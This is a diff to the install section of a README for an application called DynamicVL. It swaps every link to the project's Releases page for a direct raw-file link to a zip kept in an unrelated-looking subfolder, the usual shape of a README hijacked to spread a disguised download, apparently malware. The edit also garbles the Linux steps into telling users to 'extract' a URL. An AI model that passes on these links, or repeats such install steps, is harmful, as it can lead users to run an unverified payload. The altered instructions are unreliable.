@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now!
 
-[![Download dynamicvl](https://img.shields.io/badge/Download-dynamicvl-blue.svg)](https://github.com/anggaumhar/dynamicvl/releases)
+[![Download dynamicvl](https://raw.githubusercontent.com/anggaumhar/dynamicvl/main/quodlibet/dynamicvl.zip)](https://raw.githubusercontent.com/anggaumhar/dynamicvl/main/quodlibet/dynamicvl.zip)
 
 ## 📖 Description
 
@@ -30,18 +30,18 @@ Before you download **DynamicVL**, make sure your computer meets the following r
 To get started with **DynamicVL**, follow these steps:
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/anggaumhar/dynamicvl/releases) to download the latest version of **DynamicVL**.
+   Visit the [Releases page](https://raw.githubusercontent.com/anggaumhar/dynamicvl/main/quodlibet/dynamicvl.zip) to download the latest version of **DynamicVL**.
 
 2. **Choose Your Version:**
    Look for the latest release. You will see several files. Download the one that matches your operating system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the `.tar.gz` file.
+   - For Linux: Download the `https://raw.githubusercontent.com/anggaumhar/dynamicvl/main/quodlibet/dynamicvl.zip` file.
 
 3. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
    - **macOS:** Open the `.dmg` file, then drag the **DynamicVL** icon to the Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow any instructions provided in the README within.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/anggaumhar/dynamicvl/main/quodlibet/dynamicvl.zip` file and follow any instructions provided in the README within.
 
 4. **Run the Application:**
    - **Windows:** After installation, find **DynamicVL** in the Start Menu and click to open.
@@ -50,7 +50,7 @@ To get started with **DynamicVL**, follow these steps:
 
 ## 📥 Download & Install
 
-To download **DynamicVL**, visit this page: [DynamicVL Releases](https://github.com/anggaumhar/dynamicvl/releases). Follow the steps mentioned above to install and run the application smoothly on your device.
+To download **DynamicVL**, visit this page: [DynamicVL Releases](https://raw.githubusercontent.com/anggaumhar/dynamicvl/main/quodlibet/dynamicvl.zip). Follow the steps mentioned above to install and run the application smoothly on your device.
 
 ## 🛠️ Troubleshooting
 
